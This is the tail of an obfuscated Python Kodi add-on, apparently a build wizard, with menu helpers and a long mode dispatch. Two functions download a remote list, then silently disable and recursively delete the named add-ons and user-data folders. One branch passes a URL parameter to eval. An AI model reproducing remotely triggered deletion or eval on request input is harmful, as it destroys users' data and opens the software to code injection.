	OO0000000OO00OOO0 =xbmcgui .ListItem (OO00O0O0O0OOOOO00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6864
	OO0000000OO00OOO0 .setInfo (type ="Video",infoLabels ={"Title":OO00O0O0O0OOOOO00 ,"Plot":description })#line:6865
	OO0000000OO00OOO0 .setProperty ("Fanart_Image",fanart )#line:6866
	if not menu ==None :OO0000000OO00OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6867
	O00OOOO00O00000O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00000000O0O0O00 ,listitem =OO0000000OO00OOO0 ,isFolder =True )#line:6868
	return O00OOOO00O00000O0 #line:6869
def addFile (O000000OO0O0O0O00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6871
	O0OO0OO00OO00000O =sys .argv [0 ]#line:6872
	if not mode ==None :O0OO0OO00OO00000O +="?mode=%s"%urllib .quote_plus (mode )#line:6873
	if not name ==None :O0OO0OO00OO00000O +="&name="+urllib .quote_plus (name )#line:6874
	if not url ==None :O0OO0OO00OO00000O +="&url="+urllib .quote_plus (url )#line:6875
	OOOOOOOOO0O000O00 =True #line:6876
	if themeit :O000000OO0O0O0O00 =themeit %O000000OO0O0O0O00 #line:6877
	OOO0000O0000O0OO0 =xbmcgui .ListItem (O000000OO0O0O0O00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6878
	OOO0000O0000O0OO0 .setInfo (type ="Video",infoLabels ={"Title":O000000OO0O0O0O00 ,"Plot":description })#line:6879
	OOO0000O0000O0OO0 .setProperty ("Fanart_Image",fanart )#line:6880
	if not menu ==None :OOO0000O0000O0OO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6881
	OOOOOOOOO0O000O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO0OO00OO00000O ,listitem =OOO0000O0000O0OO0 ,isFolder =False )#line:6882
	return OOOOOOOOO0O000O00 #line:6883
def get_params ():#line:6885
	O0OOOOO00O00O0OO0 =[]#line:6886
	O0O00OOOOO0OO0O0O =sys .argv [2 ]#line:6887
	if len (O0O00OOOOO0OO0O0O )>=2 :#line:6888
		OOOO00O0O0O00O0O0 =sys .argv [2 ]#line:6889
		O000O0000OOO00000 =OOOO00O0O0O00O0O0 .replace ('?','')#line:6890
		if (OOOO00O0O0O00O0O0 [len (OOOO00O0O0O00O0O0 )-1 ]=='/'):#line:6891
			OOOO00O0O0O00O0O0 =OOOO00O0O0O00O0O0 [0 :len (OOOO00O0O0O00O0O0 )-2 ]#line:6892
		OOOOO0O0O0O00000O =O000O0000OOO00000 .split ('&')#line:6893
		O0OOOOO00O00O0OO0 ={}#line:6894
		for OOO00OO000O0O00OO in range (len (OOOOO0O0O0O00000O )):#line:6895
			OOOO000OOOOO0O000 ={}#line:6896
			OOOO000OOOOO0O000 =OOOOO0O0O0O00000O [OOO00OO000O0O00OO ].split ('=')#line:6897
			if (len (OOOO000OOOOO0O000 ))==2 :#line:6898
				O0OOOOO00O00O0OO0 [OOOO000OOOOO0O000 [0 ]]=OOOO000OOOOO0O000 [1 ]#line:6899
		return O0OOOOO00O00O0OO0 #line:6901
def remove_addons ():#line:6903
	try :#line:6904
			import json #line:6905
			O00O00O000000O000 =urllib2 .urlopen (remove_url ).readlines ()#line:6906
			for OO0O0OO0O000OO0O0 in O00O00O000000O000 :#line:6907
				O0000OO00OOOOOOO0 =OO0O0OO0O000OO0O0 .split (':')[1 ].strip ()#line:6909
				OOO00O00000OO00OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0000OO00OOOOOOO0 ,'false')#line:6910
				O0OO0OO00000O0OO0 =xbmc .executeJSONRPC (OOO00O00000OO00OO )#line:6911
				O00OO0O000O0OOOOO =json .loads (O0OO0OO00000O0OO0 )#line:6912
				O0OOOO0000OOOO000 =os .path .join (addons_folder ,O0000OO00OOOOOOO0 )#line:6914
				if os .path .exists (O0OOOO0000OOOO000 ):#line:6916
					for OOO0OOOO00000O0O0 ,O0OOOO000O00OOOO0 ,O0O0OOOO00O0O0OO0 in os .walk (O0OOOO0000OOOO000 ):#line:6917
						for OOOO000000O000OO0 in O0O0OOOO00O0O0OO0 :#line:6918
							os .unlink (os .path .join (OOO0OOOO00000O0O0 ,OOOO000000O000OO0 ))#line:6919
						for OOOOOO00OOOOO0OOO in O0OOOO000O00OOOO0 :#line:6920
							shutil .rmtree (os .path .join (OOO0OOOO00000O0O0 ,OOOOOO00OOOOO0OOO ))#line:6921
					os .rmdir (O0OOOO0000OOOO000 )#line:6922
			xbmc .executebuiltin ('Container.Refresh')#line:6924
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6925
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6926
	except :pass #line:6927
def remove_addons2 ():#line:6928
	try :#line:6929
			import json #line:6930
			OO0000OOO0OO0O0O0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:6931
			for OO0O000OO0O000OO0 in OO0000OOO0OO0O0O0 :#line:6932
				OOO0O0OO0O0O00OOO =OO0O000OO0O000OO0 .split (':')[1 ].strip ()#line:6934
				O00OOO0O0O00000OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOO0O0OO0O0O00OOO ,'false')#line:6935
				OO0000O000OOOOOO0 =xbmc .executeJSONRPC (O00OOO0O0O00000OO )#line:6936
				O0O0O00O00OOO000O =json .loads (OO0000O000OOOOOO0 )#line:6937
				OOOOO0OO0000000O0 =os .path .join (user_folder ,OOO0O0OO0O0O00OOO )#line:6939
				if os .path .exists (OOOOO0OO0000000O0 ):#line:6941
					for OO000OO0O00OO0O00 ,O0OO0O000O0O0OO0O ,O000OOOOO0O00OO00 in os .walk (OOOOO0OO0000000O0 ):#line:6942
						for O00O00O00OOOOO0OO in O000OOOOO0O00OO00 :#line:6943
							os .unlink (os .path .join (OO000OO0O00OO0O00 ,O00O00O00OOOOO0OO ))#line:6944
						for OO0OOO00O00O00OO0 in O0OO0O000O0O0OO0O :#line:6945
							shutil .rmtree (os .path .join (OO000OO0O00OO0O00 ,OO0OOO00O00O00OO0 ))#line:6946
					os .rmdir (OOOOO0OO0000000O0 )#line:6947
	except :pass #line:6949
params =get_params ()#line:6950
url =None #line:6951
name =None #line:6952
mode =None #line:6953
try :mode =urllib .unquote_plus (params ["mode"])#line:6955
except :pass #line:6956
try :name =urllib .unquote_plus (params ["name"])#line:6957
except :pass #line:6958
try :url =urllib .unquote_plus (params ["url"])#line:6959
except :pass #line:6960
if not os .path .exists (os .path .join (ADDONDATA ,'4.3.0')):#line:6961
    try :#line:6962
        file =open (os .path .join (ADDONDATA ,'4.3.0'),'w')#line:6963
        file .write (str ('Done'))#line:6965
        file .close ()#line:6966
        xbmc .getInfoLabel ('System.OSVersionInfo')#line:6967
        xbmc .sleep (2000 )#line:6968
        label =xbmc .getInfoLabel ('System.OSVersionInfo')#line:6969
        ADDON .setSetting ('systemtype',label )#line:6970
    except :pass #line:6971
def setView (OOOOOO0OOO0000O0O ,O0OOO000O0OOO0OOO ):#line:6973
	if wiz .getS ('auto-view')=='true':#line:6974
		OO0000000000O0OOO =wiz .getS (O0OOO000O0OOO0OOO )#line:6975
		if OO0000000000O0OOO =='50'and KODIV >=17 and SKIN =='skin.estuary':OO0000000000O0OOO ='55'#line:6976
		if OO0000000000O0OOO =='500'and KODIV >=17 and SKIN =='skin.estuary':OO0000000000O0OOO ='50'#line:6977
		wiz .ebi ("Container.SetViewMode(%s)"%OO0000000000O0OOO )#line:6978
if mode ==None :index ()#line:6980
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6982
elif mode =='builds':buildMenu ()#line:6983
elif mode =='viewbuild':viewBuild (name )#line:6984
elif mode =='buildinfo':buildInfo (name )#line:6985
elif mode =='buildpreview':buildVideo (name )#line:6986
elif mode =='install':buildWizard (name ,url )#line:6987
elif mode =='theme':buildWizard (name ,mode ,url )#line:6988
elif mode =='viewthirdparty':viewThirdList (name )#line:6989
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6990
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6991
elif mode =='maint':maintMenu (name )#line:6993
elif mode =='passpin':passandpin ()#line:6994
elif mode =='backmyupbuild':backmyupbuild ()#line:6995
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6996
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6997
elif mode =='advancedsetting':advancedWindow (name )#line:6998
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6999
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:7000
elif mode =='asciicheck':wiz .asciiCheck ()#line:7001
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:7002
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:7003
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:7004
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:7005
elif mode =='oldThumbs':wiz .oldThumbs ()#line:7006
elif mode =='clearbackup':wiz .cleanupBackup ()#line:7007
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:7008
elif mode =='currentsettings':viewAdvanced ()#line:7009
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:7010
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:7011
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:7012
elif mode =='fixskin':backtokodi ()#line:7013
elif mode =='testcommand':testcommand ()#line:7014
elif mode =='logsend':logsend ()#line:7015
elif mode =='rdon':rdon ()#line:7016
elif mode =='rdoff':rdoff ()#line:7017
elif mode =='setrd':setrealdebrid ()#line:7018
elif mode =='setrd2':setautorealdebrid ()#line:7019
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:7020
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:7021
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:7022
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:7023
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:7024
elif mode =='freshstart':freshStart ()#line:7025
elif mode =='forceupdate':wiz .forceUpdate ()#line:7026
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:7027
elif mode =='forceclose':wiz .killxbmc ()#line:7028
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:7029
elif mode =='hidepassword':wiz .hidePassword ()#line:7030
elif mode =='unhidepassword':wiz .unhidePassword ()#line:7031
elif mode =='enableaddons':enableAddons ()#line:7032
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:7033
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:7034
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:7035
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:7036
elif mode =='uploadlog':uploadLog .Main ()#line:7037
elif mode =='viewlog':LogViewer ()#line:7038
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:7039
elif mode =='viewerrorlog':errorChecking (all =True )#line:7040
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:7041
elif mode =='purgedb':purgeDb ()#line:7042
elif mode =='fixaddonupdate':fixUpdate ()#line:7043
elif mode =='removeaddons':removeAddonMenu ()#line:7044
elif mode =='removeaddon':removeAddon (name )#line:7045
elif mode =='removeaddondata':removeAddonDataMenu ()#line:7046
elif mode =='removedata':removeAddonData (name )#line:7047
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:7048
elif mode =='systeminfo':systemInfo ()#line:7049
elif mode =='restorezip':restoreit ('build')#line:7050
elif mode =='restoregui':restoreit ('gui')#line:7051
elif mode =='restoreaddon':restoreit ('addondata')#line:7052
elif mode =='restoreextzip':restoreextit ('build')#line:7053
elif mode =='restoreextgui':restoreextit ('gui')#line:7054
elif mode =='restoreextaddon':restoreextit ('addondata')#line:7055
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:7056
elif mode =='traktsync':traktsync ()#line:7057
elif mode =='apk':apkMenu (name )#line:7059
elif mode =='apkscrape':apkScraper (name )#line:7060
elif mode =='apkinstall':apkInstaller (name ,url )#line:7061
elif mode =='speed':speedMenu ()#line:7062
elif mode =='net':net_tools ()#line:7063
elif mode =='GetList':GetList (url )#line:7064
elif mode =='youtube':youtubeMenu (name )#line:7065
elif mode =='viewVideo':playVideo (url )#line:7066
elif mode =='addons':addonMenu (name )#line:7068
elif mode =='addoninstall':addonInstaller (name ,url )#line:7069
elif mode =='savedata':saveMenu ()#line:7071
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:7072
elif mode =='managedata':manageSaveData (name )#line:7073
elif mode =='whitelist':wiz .whiteList (name )#line:7074
elif mode =='trakt':traktMenu ()#line:7076
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:7077
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:7078
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:7079
elif mode =='cleartrakt':traktit .clearSaved (name )#line:7080
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:7081
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:7082
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:7083
elif mode =='realdebrid':realMenu ()#line:7085
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:7086
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:7087
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:7088
elif mode =='cleardebrid':debridit .clearSaved (name )#line:7089
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:7090
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:7091
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:7092
elif mode =='login':loginMenu ()#line:7094
elif mode =='savelogin':loginit .loginIt ('update',name )#line:7095
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:7096
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:7097
elif mode =='clearlogin':loginit .clearSaved (name )#line:7098
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:7099
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:7100
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:7101
elif mode =='contact':notify .contact (CONTACT )#line:7103
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:7104
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:7105
elif mode =='developer':developer ()#line:7107
elif mode =='converttext':wiz .convertText ()#line:7108
elif mode =='createqr':wiz .createQR ()#line:7109
elif mode =='testnotify':testnotify ()#line:7110
elif mode =='testnotify2':testnotify2 ()#line:7111
elif mode =='servicemanual':servicemanual ()#line:7112
elif mode =='fastinstall':fastinstall ()#line:7113
elif mode =='testupdate':testupdate ()#line:7114
elif mode =='testfirst':testfirst ()#line:7115
elif mode =='testfirstrun':testfirstRun ()#line:7116
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:7117
elif mode =='bg':wiz .bg_install (name ,url )#line:7119
elif mode =='bgcustom':wiz .bg_custom ()#line:7120
elif mode =='bgremove':wiz .bg_remove ()#line:7121
elif mode =='bgdefault':wiz .bg_default ()#line:7122
elif mode =='rdset':rdsetup ()#line:7123
elif mode =='mor':morsetup ()#line:7124
elif mode =='mor2':morsetup2 ()#line:7125
elif mode =='firstinstall':firstinstall ()#line:7126
elif mode =='resolveurl':resolveurlsetup ()#line:7127
elif mode =='urlresolver':urlresolversetup ()#line:7128
elif mode =='forcefastupdate':forcefastupdate ()#line:7129
elif mode =='traktset':traktsetup ()#line:7130
elif mode =='placentaset':placentasetup ()#line:7131
elif mode =='flixnetset':flixnetsetup ()#line:7132
elif mode =='reptiliaset':reptiliasetup ()#line:7133
elif mode =='yodasset':yodasetup ()#line:7134
elif mode =='numbersset':numberssetup ()#line:7135
elif mode =='uranusset':uranussetup ()#line:7136
elif mode =='genesisset':genesissetup ()#line:7137
elif mode =='fastupdate':fastupdate ()#line:7138
elif mode =='folderback':folderback ()#line:7139
elif mode =='menudata':Menu ()#line:7140
elif mode =='infoupdate':infobuild ()#line:7141
elif mode =='wait':wait ()#line:7142
elif mode ==2 :#line:7143
        wiz .torent_menu ()#line:7144
elif mode ==3 :#line:7145
        wiz .popcorn_menu ()#line:7146
elif mode ==8 :#line:7147
        wiz .metaliq_fix ()#line:7148
elif mode ==9 :#line:7149
        wiz .quasar_menu ()#line:7150
elif mode ==5 :#line:7151
        swapSkins ('skin.Premium.mod')#line:7152
elif mode ==13 :#line:7153
        wiz .elementum_menu ()#line:7154
elif mode ==16 :#line:7155
        wiz .fix_wizard ()#line:7156
elif mode ==17 :#line:7157
        wiz .last_play ()#line:7158
elif mode ==18 :#line:7159
        wiz .normal_metalliq ()#line:7160
elif mode ==19 :#line:7161
        wiz .fast_metalliq ()#line:7162
elif mode ==20 :#line:7163
        wiz .fix_buffer2 ()#line:7164
elif mode ==21 :#line:7165
        wiz .fix_buffer3 ()#line:7166
elif mode ==11 :#line:7167
        wiz .fix_buffer ()#line:7168
elif mode ==15 :#line:7169
        wiz .fix_font ()#line:7170
elif mode ==14 :#line:7171
        wiz .clean_pass ()#line:7172
elif mode ==22 :#line:7173
        wiz .movie_update ()#line:7174
elif mode =='simpleiptv':#line:7177
    DIALOG =xbmcgui .Dialog ()#line:7179
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:7180
    if choice ==1 :#line:7181
        iptvkodi17_18 ()#line:7182
    else :#line:7184
     sys .exit ()#line:7185
elif mode =='simpleidanplus':#line:7187
    DIALOG =xbmcgui .Dialog ()#line:7188
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:7189
    if choice ==1 :#line:7190
        iptvidanplus ()#line:7191
    else :#line:7193
     sys .exit ()#line:7194
elif mode =='update_tele':updatetelemedia (NOTEID )#line:7196
elif mode =='adv_settings':buffer1 ()#line:7197
elif mode =='getpass':getpass ()#line:7198
elif mode =='setpass':setpass ()#line:7199
elif mode =='setuname':setuname ()#line:7200
elif mode =='check_firebase':check_firebase ()#line:7201
elif mode =='passandUsername':passandUsername ()#line:7203
elif mode =='9':disply_hwr ()#line:7204
elif mode =='99':disply_hwr2 ()#line:7205
elif mode =='80':send_hwr ()#line:7206
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))